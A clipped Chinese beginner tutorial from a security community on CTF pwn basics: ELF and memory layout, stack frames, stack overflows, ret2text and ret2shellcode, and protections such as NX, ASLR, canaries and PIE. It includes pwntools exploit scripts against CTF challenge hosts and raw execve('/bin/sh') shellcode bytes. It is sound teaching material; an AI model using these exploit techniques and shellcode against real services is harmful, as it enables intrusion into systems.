---
title: 【先知】CTF PWN 入门基础详细教程
source: https://xz.aliyun.com/news/92714
source_host: xz.aliyun.com
clip_date: 2026-08-21T14:42:24+08:00
trace_id: 68e0f40c-74f1-40ce-97af-fd6754a4c894
content_hash: 58ebac86c9f7d8fadfa3b25df1b7dfc66ef395cf187195cd80de0baaf41f1aa1
status: synced
tags:
  - 先知
  - CTF
  - 漏洞分析
series: null
feed_source: 先知安全技术社区
ai_summary: CTF PWN入门教程：栈溢出利用核心是覆盖返回地址劫持控制流，按保护机制选择ret2text、ret2shellcode、ret2syscall、ret2libc方案，并注意64位栈对齐。
ai_summary_style: key-points
images_status:
  total: 83
  succeeded: 83
  failed_urls: []
notion_page_id: 3c375244-d011-81a6-9a76-e1e1f7030c6c
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> CTF PWN入门教程：栈溢出利用核心是覆盖返回地址劫持控制流，按保护机制选择ret2text、ret2shellcode、ret2syscall、ret2libc方案，并注意64位栈对齐。
> 
> - **栈溢出原理：** gets/read等函数不做边界检查，溢出可跨过saved RBP（32位4字节、64位8字节）覆盖返回地址；偏移量=缓冲区到RBP距离+帧指针大小，如32位例题buf距EBP 108字节，加4得112。
> - **ret2text与ret2shellcode：** ret2text将返回地址改为.text中已有后门函数；NX未开启或经mprotect将BSS页设为RWX时，可把shellcode写入栈或全局变量（如name）再跳转执行。
> - **ret2syscall：** 用ROPgadget找pop;ret gadget设置寄存器，eax=0xb、ebx指向"/bin/sh"、ecx=edx=0，再执行int 0x80触发execve("/bin/sh")。
> - **ret2libc：** 程序无system时，先经puts@plt泄露__libc_start_main的GOT表项真实地址，用libc-database或LibcSearcher匹配版本并计算libc基址，推出system与/bin/sh地址后二次溢出执行；32位ROP链需按system地址、伪返回地址、参数顺序排布。
> - **GOT/PLT与栈对齐：** PLT是外部函数跳板，GOT缓存解析后的libc真实地址，首次调用经动态解析器写入；x86-64 System V ABI要求16字节对齐，必要时在ROP链中插一个纯ret gadget使RSP额外移动8字节。

## 摘要

本文整理了笔者学习 CTF PWN 基础阶段的笔记，围绕程序编译与链接、ELF、进程内存、栈溢出、ROP 和常见保护机制展开。内容以入门理解和本地调试为主。

这里推荐B站上星盟安全团队的PWN系列课程

### PWN 中的重要概念

1.  `exploit` ：用于验证漏洞利用思路的脚本或方案。
2.  `payload` ：输入给目标程序的数据载荷，通常用于触发漏洞、覆盖控制数据或传递参数。
3.  `shellcode` ：可直接执行的机器码，常用于在可执行内存中启动 shell 或完成指定动作。
4.  `shell` ：与操作系统交互的命令解释器，例如 `/bin/sh` 。

### PWN 基础：编译、链接与装载

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/de2d8a4756056fd2.png)

以 `printf()` 为例：源文件编译后仅生成对外部符号的引用；链接阶段会把该引用与相应库中的实现建立关联。

动态链接：可执行文件保留对共享库函数的引用，装载或首次调用时由动态链接器完成解析。

静态链接：链接器将所需库代码复制进可执行文件，生成的文件通常更大，但运行时对共享库的依赖更少。

### 5\. 可执行文件

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/2efd1389d3412bf1.png)

##### ELF 文件格式

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/ba3a19129d390ce7.png)

文件头：记录 ELF 类型、目标架构、入口地址以及程序头表和节头表的位置。

代码通常位于 `.text` 节（而非 `.code` ）。

`.text` ：通常可读、可执行，用于存放程序指令。

`.plt` ：过程链接表，保存外部函数调用使用的跳板代码。

数据

### 6\. 磁盘和内存

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/22aec573c137c86e.png)

磁盘上的 ELF 主要按“节（section）”组织；装载到内存后，加载器按“段（segment）”映射并赋予读、写、执行权限。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/99041de5ebc07aef.png)

ELF 装载时，属性相近的节通常会被映射到同一可加载段中。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/fed03b580e7a2118.png)

### 7\. 从实模式到保护模式

实模式：CPU 使用分段后的物理地址，缺少现代操作系统提供的进程隔离与分页保护。

保护模式：程序使用虚拟地址；MMU 会结合页表把虚拟地址转换为物理地址，并由操作系统实施权限与隔离。 ![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/97bf68f7ba1ef4c5.png)

高1GB是内核空间(内核代码)

低3GB是用户空间

BSS 栈

数据

代码

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/2af453a453b0cc14.png)

下方通常是静态存储区，对应全局变量、静态变量及相关映射。

### 8\. 段和节

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/23258c43701ecf8b.png)

段：给已经载入内存的文件(进程)，不同部分来标识其可读可写可执行权限

节：磁盘上，如何生成和存储

`.text` ：程序代码，通常具有可读、可执行权限。

`.plt` ：调用动态库函数时使用的跳板代码；首次调用可能触发动态解析。

`.got.plt` ：保存 PLT 解析后的函数地址，后续调用可直接间接跳转。

.bss

#### 关键PPT

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/970c2156ac550e53.png)

不同区域的增长方向取决于实现；在常见 Linux 进程布局中，栈通常向低地址扩展，堆通常向高地址扩展。

栈是从高地址向低地址增长

为什么？栈内存的整体增长方向是从高地址向低地址扩展，也就是说，每次向栈中压入数据时，新数据会放在比当前数据更低的地址上

在向下增长的栈中，后压入的数据位于更低的地址。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/0e0ea041d29cd4f9.png)

数组压入栈时是倒序压入 比如arg1在A+1 arg2

在A 高地址向低地址

**反向压入**，出栈的时候就是正向的

**高地址区**：保存了函数调用时的返回地址、保存的帧指针等。

**低地址区**：用于存放局部变量（包括可能存在漏洞的缓冲区

低地址

高地址 ![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/83c5cbaef4bb2b51.png)

Heap ：堆 堆是一种动态分配的内存区域

Stack ：栈 栈是一种后进先出（LIFO）的数据结构，主要用于存储函数的局部变量、参数和返回地址

### 9\. 栈溢出攻击是什么

栈溢出攻击的基本原理主要是利用程序在处理输入时没有进行严格边界检查，从而允许攻击者向分配在栈上的缓冲区写入超过其容量的数据。这种超出预期的数据写入可能会覆盖存储在栈上的其他关键数据，比如函数的返回地址。若覆盖到返回地址，函数执行 `ret` 时就可能跳转到攻击者指定的位置，从而改变控制流。

#### 关键部分

**栈内存布局**  
程序在函数调用时，会在栈上分配内存用于存储局部变量、函数参数以及返回地址。栈的内存布局通常是连续且顺序存放的，这为攻击者提供了利用数据溢出修改控制流的可能性。

**缓冲区溢出漏洞**  
当程序从外部接收数据时，如果没有对输入数据的长度进行严格检查，就有可能将超出缓冲区容量的数据写入到栈内存中。攻击者可以借此覆盖紧邻缓冲区的关键数据。

**控制流劫持**  
通过覆盖栈上的返回地址或其他控制数据，攻击者可以使程序在函数返回时跳转到攻击者指定的地址。目标位置可以是预先写入的代码（如 shellcode），也可以是现有代码片段或库函数；具体方式取决于 NX、ASLR、PIE 等保护状态。

**构造恶意Payload**  
攻击者需要精心构造输入数据（payload），使其既包含足够多的数据填充溢出前的缓冲区，又在溢出部分精确覆盖返回地址，使得程序的执行流程转向攻击者希望执行的代码区域。

### 10\. 大端序和小端序

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/a3721c624ea2b665.png)

小端序：最低有效字节存放在低地址；大端序：最高有效字节存放在低地址。

数据从低地址往高地址写入

### 11\. 进程的执行过程

地址总线

数据总线 寄存器

指令总线

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/ea28acc62b6c5a65.png)

RIP：保存下一条将要执行的指令地址（32 位下对应 EIP）。

RSP：保存当前栈顶地址（32 位下对应 ESP）。

RBP：常用作当前栈帧的基址指针（32 位下对应 EBP；是否使用取决于编译优化）。

RAX 通用寄存器 存放函数返回值

什么是栈帧呢？

#### 静态链接和动态链接

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/2a7642c9d215f0b0.png)

用户代码

内核代码

#### 动态链接补充

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/7e7bb7eab1f07ceb.png)

就是在内核加载时 会启动一个 ld.so 程序

导入的外部的.so 动态链接文件

### 12\. 常用汇编

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/cdb1d6e940746e29.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/bb03cc5180552ee3.png)

\[ \] 取值

压栈 出栈

`leave` ：常见函数尾声，等价于 `mov esp/rsp, ebp/rbp; pop ebp/rbp` ，用于恢复调用者栈帧。

`ret` ：从栈顶取出返回地址并跳转；在 32 位下可理解为弹入 EIP，在 64 位下弹入 RIP。

栈帧 每次方法调用都会创建一个 `栈帧`

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/06cab71ee26142db.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/6e4be7c0345941d7.png)

## 二、栈溢出基础

## 1\. C 语言函数调用栈

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/ac324ff2a8d143c3.png)

通常一次函数调用对应一个栈帧；编译器优化可能省略帧指针或改变具体布局。

### 栈的结构

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/6e533a88c4b1639e.png)

`return address` ：函数执行 `ret` 后将跳转到的地址。

`saved frame pointer` ：保存的调用者帧指针。若需要覆盖返回地址，通常要跨过该位置：32 位为 4 字节，64 位为 8 字节。

`local variables` ：当前函数的局部变量区。

`arguments` ：参数传递位置由 ABI 决定。x86-32 常通过栈传参；x86-64 System V ABI 的前六个整型/指针参数通常通过寄存器传递。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/9435e78ff68db748.png)

在未省略帧指针的典型 32 位栈帧中，ESP 与 EBP 可用于定位局部变量区；实际布局仍应以反汇编为准。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/fe9809634db55c79.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/2736f72565612477.png)

`pop ebp` 前，ESP 指向保存的调用者 EBP；执行后，EBP 恢复为该保存值，ESP 再增加一个字长。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/09aca4bdb0e463b0.png)

32位字长 是32bit 4字节

64位系统 pop一下 一个字长 64bit 弹出8字节数据

`call` ：先把下一条指令地址压栈，再跳转到目标函数。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/9cb612cc6887e755.png)

## 2\. ret2text

return to text（返回到 `.text` 节中的已有代码）

`.text` 节中存在可利用的后门或目标函数。

通过覆盖返回地址跳转到 `.text` 节中的目标函数。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/fd82ce3e3ca18b4d.png)

动态链接相关区域是否只读取决于 RELRO：Full RELRO 会在重定位后保护 GOT，Partial RELRO 通常仍保留部分可写 GOT 表项。

NX 开启后，栈通常不可执行。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/89eb6c958f4027cd.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/fe0b358ccf298b92.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/0565e6c86fbf754f.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/ed2b4f7ba24b1891.png)

返回地址

前一个栈栈低指针

缓冲区

### gets函数

`gets()` 会从标准输入读取到换行或 EOF，但不接收缓冲区长度参数，因此无法进行边界检查。

### read 函数

### read() 函数原型

```plain
ssize_t read(int fd, void *buf, size_t count);
```

`fd` ：文件描述符

`buf` ：要读取数据存储的缓冲区地址

`count` ：要读取的字节数

`read()` 并不会帮你检查 `buf` 的大小，你告诉它读多少字节，它就会尝试读多少字节

`gets()` 也会无限读取，直到遇到换行，但不会做边界检查。  
`read()` 本身按调用者提供的 `count` 读取；当 `count` 大于目标缓冲区容量且程序缺少检查时，才会造成溢出。  
它不会知道 `buf` 实际分配了多大空间，边界检查必须由调用者完成。

C语言字符串末尾要有 \\x00 来标识字符串结束

vulnerable 易受 攻击的

io =process("./ret2text") 打开本地连接

io = remote("HOST", PORT) 连接远程服务

node5.anna.nssctf.cn:26952

io.recvline() 接收字符串

io.send(p64(1)+b"aaaaaaaa" ) 发送字符串 64位 字符串 b代表byte类型，字节类型

io.send(p32(0)+b"\\x0a")

64bit宽度的字节流数据

io.sendline(b"jsdhahkdda") 自动加换行符 等效于io.send(b"jsdhahkdda\\n")

io.interactive() 交互

```python
from pwn import *
 
io =remote('node1.anna.nssctf.cn',28287)
 
backdoor =0x4014BA
ret =0x40101a
 
payload = b'A' * (0x40 + 8) + p64(ret) + p64(backdoor)  #
 
io.sendline(payload)
io.interactive()
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/f9013fdf68738296.png)

因为缓冲区buf距离栈底rbp为0x40 而rbp本身是8字节，所以就是0x40+8

为什么加返回函数的地址 ret

栈帧结构

\[ padding （局部变量）\]  
\[ saved RBP (8字节) \]  
\[ return address (8字节) \] <== 程序ret指令后会跳到这里

用 `b'A'*(0x40+8)` 填充时，刚好把：

-   0x40 字节的缓冲区
-   再加上 8 字节的 saved RBP  
    **写满之后，下一步就是覆盖 return address！**
-   如果直接写 `p64(backdoor)` ，程序 `ret` 指令执行时会跳到 `backdoor` 。
-   但是有时候 `backdoor` 地址不是 "栈对齐友好" 的，或者保护机制要求 16 字节对齐，
-   如果直接 ret 到 `backdoor` ，可能会因为栈不对齐导致崩溃（通常出现 `SIGSEGV` 或 `alignment` 错误）。
-   加上一个 `ret` 指令地址（即 `p64(ret)` ）相当于让程序 **先执行一个 ret 指令**，这个 ret 会弹出下一个地址（就是 `backdoor` ），同时让栈指针对齐到 16 字节。

➡️ 这种套路叫做 “ **ret 滑板 (ret gadget)** ”，就是用一个 `ret` 指令来修正栈对齐，让后续 `ret` 到你要去的地址（ `backdoor` ）时更加稳定。

### 关于栈对齐

栈对齐并非只存在于 64 位。对于 x86-64 System V ABI，进入函数时通常要求调用点满足 16 字节对齐约束；ROP 中是否需要额外 `ret` ，应根据溢出发生时的 RSP、目标函数序言和调用路径计算，不能只按 payload 长度或 `p64()` 个数判断。

若经调试确认 RSP 未满足目标函数的 ABI 对齐要求，可在 ROP 链中插入一个单独的 `ret` gadget，使 RSP 额外移动 8 字节；应选择确实只执行 `ret` 的地址。

比如上面这个题就是加上一个ret地址

为什么要变成偶数倍

对于 x86_64 架构（64 位），通常要求堆栈是 16 字节对齐的。这意味着在进行函数调用时，堆栈指针（ `rsp` ）必须是 16 的倍数。

**堆栈对齐**：在 64 位架构上，通常要求堆栈指针（ `rsp` ）是 16 字节对齐的。也就是说，在函数调用时， `rsp` 地址应该是 16 字节的倍数。如果你向堆栈中推送数据，应该保证每次操作后， `rsp` 的值仍然是 16 字节的倍数。

**判断依据不是 payload 总长度**：

-   `p64()` 生成 8 字节小端序数据；每个 `ret` 或 `pop` gadget 对 RSP 的影响不同，应把 padding、保存的 RBP、gadget 消耗的栈槽和函数入口状态一起计算。

**如何验证对齐**：

-   在目标函数入口或崩溃位置检查 `$rsp & 0xf` ，再结合 ABI 和反汇编决定是否插入 `ret` 。

### 工具熟悉

### pwndbg使用方式

r 就是run 直接跑起来

b 就是breakpoint 打断点

如 b \*804800

或者b main 在main打断点

s 即 `step` ，单步步入。

n 即 `next` ，单步步过。

`stack 24` ：查看栈上前 24 个字长的数据。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/572473a7b5610214.png)

寄存器

反汇编

栈

函数调用栈的关系

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/03ad0a9a60dfd928.png)

保存的 EBP 是调用者的帧指针值，用于函数返回时恢复调用者栈帧。

保存的 EBP 上方一个字长的位置通常是返回地址。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/e98c42423e95d3e6.png)

后门函数

system("/bin/sh") 传一个系统命令

buffer 缓冲区

`/bin/sh` 是 Unix 和 Linux 系统中的一个「标准 shell 程序」的路径

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/6f235aeb722b25bd.png)

buffer与ebp的距离是10h就是16

但是ebp本身还有4个字节 所以要填充20字节垃圾数据

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/236f736c216dc711.png)

### ida

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/e0118cb856d28433.png)

IDA 中的颜色由主题和分析状态决定，不能单凭颜色判断函数是否已静态链接；应结合导入表、 `plt` / `got` 和交叉引用分析。

外部导入函数通常需要经 PLT/GOT 或导入表在运行时解析，具体表现应以二进制格式和 IDA 标注为准。

## 3\. ret2shellcode

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/a2dca8cc4e779140.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/58ad855c9912c820.png)

这个buf2 是全局变量，未在函数内部声明，保存在bss段

BSS段紧随 `.data` 段之后

0x04A080

```plain
0x804a000  0x804b000 rw-p     1000 1000   /home/ubuntu/Desktop/pwn2/ret2shellcode
```

这就是bss段

```plain
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf("bye bye ~");
  return 0;
}
```

看到 char s\[100\] 就是缓冲区占100个字节

### 如何计算偏移量

## 1\. 找到get函数地址

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/fb4d1b22a2a11c63.png)

在pwndbg里下断点看栈帧

```plain
pwndbg> b *0x8048593
Breakpoint 1 at 0x8048593: file ret2shellcode.c, line 14.
pwndbg> r
Starting program: /home/ubuntu/Desktop/pwn2/ret2shellcode 
No system for you this time !!!

Breakpoint 1, 0x08048593 in main () at ret2shellcode.c:14
14	ret2shellcode.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────
 EAX  0xffffd07c ◂— 0x0
 EBX  0x0
 ECX  0xffffffff
 EDX  0xffffffff
 EDI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0xffffd0e8 ◂— 0x0
 ESP  0xffffd060 —▸ 0xffffd07c ◂— 0x0
 EIP  0x8048593 (main+102) —▸ 0xfffe38e8 ◂— 0x0
```

断到 `gets` 调用位置或函数返回点附近。

c 是continue继续运行

在断点处确认传给 `gets` 的缓冲区地址，并与当前 EBP/RBP 比较，以计算到返回地址的偏移。

使用 `stack 24` 查看栈上前 24 个字长的数据；数量可按需要调整。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/efb95d62f24c2ee4.png)

在该调用点，EAX 中保存了传给 `gets` 的缓冲区 `s` 地址。

0xffffd07c

EBP栈底指针的地址是0xffffd0e8

EBP 与 `s` 起始地址相差 108 字节。

再加上 **保存的帧指针** （通常是4字节，保存了上一层函数调用的栈帧指针）4

因此，覆盖返回地址的偏移为 112 字节。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/9e46ba89d40da265.png)

```plain
from pwn import *

sh = process('./shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr =0x04040A0

sh.sendline(shellcode.ljust(264, b'A') + p64(buf2_addr))
sh.interactive()
```

read 0x401257

### 最终脚本

```plain
from pwn import *
context(arch="amd64")      # amd64 是 x86-64 架构的常用名称。
p = remote("node5.buuoj.cn",29958)
shellcode = asm(shellcraft.sh())
target = 0x0601050
payload = shellcode.ljust(96+8, b"A") + p64(target)   
p.sendline(payload)
p.interactive()
```

`shellcode` 是通过 `asm(shellcraft.sh())` 生成的获取shell的机器码

`.ljust(96+8, b"A")` 意味着：

-   将shellcode填充到104字节长度(96+8)
-   使用字节"A"(ASCII值为65)作为填充字符
-   其中96字节可能是到返回地址的偏移量，8字节是保存的基指针(rbp)

`+ p64(target)` 表示：

-   将地址 `0x0601050` (存储在target变量中)转换为64位小端格式
-   这个地址将覆盖原始的返回地址
-   程序执行完当前函数后会跳转到这个地址，即存放shellcode的位置

shellcode写入target的位置 就是buf2

`0x04040A0` 与 `0x4040A0` 表示同一个数值；前导零不会改变地址。若利用失败，应检查地址是否正确、权限是否满足以及 RSP 对齐，而非前导零数量。

#### 例题 \[SWPUCTF 2023 秋季新生赛\]Shellcode

刚进来就看到有一个类似花指令的东西，nop掉就正常反汇编了

主函数

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[104]; // [rsp+0h] [rbp-70h] BYREF
  unsigned __int64 v5; // [rsp+68h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  setbuf(stdin, 0LL);
  puts("Hello! Welcome to the pwn world!");
  puts("Do you know what shellcode is?");
  puts("Let's have a try!");
  read(0, buf, 0x64uLL);
  return 0;
}
root@ubuntu:/home/ubuntu/Desktop/pwn2# checksec shellcode
[!] Could not populate PLT: module 'importlib.resources' has no attribute 'files'
[*] '/home/ubuntu/Desktop/pwn2/shellcode'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

若 NX 未启用或栈映射具有执行权限，则可以考虑将 shellcode 写入栈缓冲区； `NX unknown - GNU_STACK missing` 不能直接等同于“栈可执行”，需用 `vmmap` 、 `readelf -l` 或实际调试确认。

这里的 `buf` 是 `main` 的局部变量，位于栈上； `read` 读取长度为 `0x64` ，恰好没有超过其 104 字节容量。

这里我以前一直有一个误区，就是需要计算全局变量到栈底esp的距离 然后填充垃圾数据，把shellcode精准填入返回地址执行

这里应区分“写入 shellcode”和“取得执行控制”。仅把 shellcode 写入缓冲区并不会自动执行；还必须存在跳转到该缓冲区的控制流，例如程序自身跳转、函数指针调用或覆盖返回地址。该题若确实能直接获得控制权，应以实际反汇编确认后续是否跳转到 `buf` 。

```python
from pwn import *

io = remote ('node4.anna.nssctf.cn',28697)
context.binary = './shellcode'   //二进制文件位置

payload = asm(shellcraft.sh())   # 自动生成 shellcode
io.sendline(payload)
io.interactive()
```

若程序后续会跳转到这段可执行缓冲区，则可以获得 shell。

那为什么之前的例题需要精准控制呢

那是因为之前的例题开启了NX就是栈不可执行，就算写入栈也不会当做代码执行

不能直接向栈缓冲区写入shellcode

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/962386637476267f.png)

只能向bss段的全局变量buf2写入shellcode，所以需要精准控制函数执行流，就是覆盖返回地址为buf2的地址

#### 例题 \[GDOUCTF 2023\]Shellcode

64位，栈不可执行

主函数

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[10]; // [rsp+6h] [rbp-Ah] BYREF

  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  setbuf(stdout, 0LL);
  mprotect((void *)((unsigned __int64)&stdout & 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7);
  puts("Please.");
  read(0, &name, 0x25uLL);
  puts("Nice to meet you.");
  puts("Let's start!");
  read(0, buf, 0x40uLL);
  return 0;
}
```

这里陷入了很大的误区

`name` 位于 `.bss` ，默认通常可写但不可执行。题目通过 `mprotect` 将包含 `name` 的页改为 `RWX` ，因此才可以把 shellcode 写入其中并执行。

`buf` 是 `main` 的局部变量，位于栈上。第二次 `read` 向 `buf` 写入超过其容量的数据，可覆盖保存的 RBP 和返回地址；把返回地址改为 `name` 的地址，即可在该页已具备执行权限时跳转到写入的 shellcode。

题目给了

```c
char buf[10]; // [rsp+6h] [rbp-Ah] BYREF
```

buf距离 rbp是0x0A 所以需要覆盖的垃圾字节长度是0x0A+8

而且name变量最长是25字节

返回地址由 `call` 指令压栈。在 64 位程序中，保存的 RBP 和返回地址各占 8 字节，因此从 `buf` 到返回地址的偏移通常为“缓冲区到 RBP 的距离 + 8”。

```plain
leave   ; 等价于 mov rsp, rbp; pop rbp
ret     ; 等价于 pop rip（从栈顶取返回地址跳转）
```

-   所以， **返回地址** 存放在 `rbp + 8` 处（64 位）。

## 比较短的shellcode

有时候会对shellcode的长度进行限制，所以需要积累短一点的shellcode

32 位短字节 shellcode -> 21 字节 \\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80

64 位 较短的 shellcode 23 字节 \\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f \\x05

在 CTF 环境中，也可按题目交互需求构造更短的执行命令 shellcode。

## 最终脚本

```plain
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
io = remote ('node4.anna.nssctf.cn',28479)

name_address= 0x6010A0
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
io.sendlineafter(b"Please.", shellcode)     # 在程序输出 Please. 后写入 shellcode
payload = b'a' * (0x0A + 0x8) + p64(name_address)  # 如需修正对齐，应验证后插入一个仅含 ret 的 gadget。
io.sendlineafter("start!",payload)
io.interactive()
```

## 4\. ret2syscall

看下面的ret2syscall

## 5\. ret2libc

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/70966fc17222e791.png)

## 三、内存保护措施

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/b7e2a45147945020.png)

**Arch:** `i386-32-little`

-   说明该二进制文件是 32 位的 x86 架构（Intel 体系结构），采用小端（little-endian）存储方式。

**RELRO:** `Partial RELRO`

-   **RELRO（Relocation Read-Only）** 是一个保护机制，防止某些 GOT（Global Offset Table）表项被篡改。
-   `Partial RELRO` 说明部分 RELRO 保护已启用，但 GOT 仍然可写，攻击者可能利用 GOT 表进行劫持。

**Stack:** `No canary found`

-   说明程序未启用 **栈金丝雀（Stack Canary）**，即没有在栈溢出时检测数据篡改，易受缓冲区溢出攻击。

**NX:** `NX disabled`

-   **NX（No eXecute）** 保护用于标记某些内存区域不可执行，以防止 shellcode 执行。
-   `NX disabled` 表示没有启用 NX 保护，攻击者可以执行栈上的代码，比如 shellcode 攻击（ret2shellcode）。

**PIE:** `No PIE (0x8048000)`

-   **PIE（Position Independent Executable）** 使二进制代码的基地址随机化，提高 ASLR（地址空间布局随机化）的效果。
-   `No PIE` 说明程序没有启用 PIE，地址是固定的（0x8048000），这使得攻击者可以预测函数地址，利用 ROP（Return Oriented Programming）等攻击技术。

**RWX:** `Has RWX segments`

-   说明二进制文件的某些内存段具有 `RWX` （可读、可写、可执行）权限。
-   这种权限设置是不安全的，因为攻击者可以向可执行的内存区域写入并执行恶意代码。

### 1\. NX 位

把栈的可执行禁掉

变成栈不可执行

### 2\. ASLR

地址空间布局随机化（Address Space Layout Randomization）：随机化栈、堆、共享库和 mmap 区域的基址；PIE 与 ASLR 结合后，主程序映像的基址也会随机化。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/777e4023d1f24767.png)

### 3\. canary 金丝雀

防护缓冲区溢出

### 4\. PIE

随机化elf文件印象

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/1af4cc44dd660237.png)

PIE 影响主程序映像的基址，进而使其 `.text` 、`.data` 、`.bss` 等区域的运行时地址整体变化。

bss是存放全局变量

```plain
.text	可执行代码	—		函数体
.data	已初始化的全局/静态变量	是（非零）		int x = 42;
.bss	未初始化或零初始化的全局/静态变量	通常不占文件内容空间，仅在节表中记录大小	运行时分配并清零	int y; 或 int z = 0;
.rodata	只读数据（字符串常量等）	是		"hello"
```

寻找全局变量，开辟缓冲区，可以输入任意数据

### NX 未开启（老系统 / 特意关闭）

-   所有内存页（包括栈、堆、`.bss` ）都 **默认可读、可写、可执行**

**BSS（Block Started by Symbol）段** 用于存储未初始化的全局变量和静态变量

### BSS 段并不存储数据，而是占位

-   在编译时，BSS 段只是一个符号表条目，不占用可执行文件的存储空间。
-   装载时，加载器会为 `.bss` 对应区域提供内存并将其初始化为零。
-   未初始化的全局变量保存在bss段里步骤 1️⃣：确定 shellcode 存放位置

### 步骤 2️⃣：计算 mprotect 的参数

|     |     |
| --- | --- | 
| 参数  | 值   |
| `addr` | `0x601000` （`.bss` 起始页） |
| `len` | `0x1000` （一页足够） |
| `prot` | `7` （即 \`PROT_READ |

### 步骤 3️⃣：找到 mprotect 的真实地址

-   通常选择 `.bss` 段（如 `0x601000~0x602000` ）
-   或通过 `read()` / `gets()` 写入已知地址
-   如果程序是 **静态链接**：可在符号表或代码中定位 `mprotect` 的实现；静态链接程序通常不依赖 `.plt` 调用 libc。
-   如果是

动态链接

```plain
（常见）：
  
- 先泄露一个 libc 函数地址（如 `puts`）
- 计算 libc 基址
